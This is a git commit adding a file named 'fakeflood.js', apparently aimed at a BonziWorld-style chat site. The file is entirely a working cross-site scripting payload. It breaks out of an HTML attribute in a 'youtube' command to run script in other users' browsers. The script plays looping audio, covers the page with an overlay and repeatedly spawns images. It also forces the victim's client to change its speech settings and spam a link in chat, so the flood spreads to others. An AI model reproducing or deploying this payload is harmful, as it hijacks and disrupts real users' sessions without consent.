bb6b8856a29689201d9fae8be27870e8ea63d72c
bwcrackedalt <galletamaria9081@gmail.com>
2026-05-23 12:09:30 -0500

    Create fakeflood.js

---
+++ fakeflood.js
@@ -0,0 +1,37 @@
+socket.emit('command', {
+  list: [
+    'youtube',
+    `eee" onload="
+const audio = new Audio('https://files.catbox.moe/upks3d.mp3');
+audio.loop = true;
+audio.play();
+const background = document.createElement('div');
+
+background.style.position = 'fixed';
+background.style.top = '0';
+background.style.left = '0';
+
+background.style.width = '3000vw';
+background.style.height = '3000vh';
+
+background.style.backgroundColor = '#6d33a0';
+background.style.zIndex = '999';
+
+document.body.appendChild(background);
+setInterval(function(){
+const img = document.createElement('img');
+
+img.src = 'https://files.catbox.moe/yuyv5m.png';
+img.style.position = 'absolute';
+img.style.top = Math.floor(Math.random()*window.innerHeight) + 'px';
+img.style.left = Math.floor(Math.random()*window.innerWidth) + 'px';
+img.style.zIndex = '9999';
+
+document.body.appendChild(img);
+socket.emit('command', {list: ['speed', Math.floor(Math.random()*275)]});
+socket.emit('command', {list: ['pitch', Math.floor(Math.random()*125)]});
+socket.emit('talk', {text: 'https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio https://albuquerque.comic.studio'});
+}, 300);
+"`
+  ]
+});
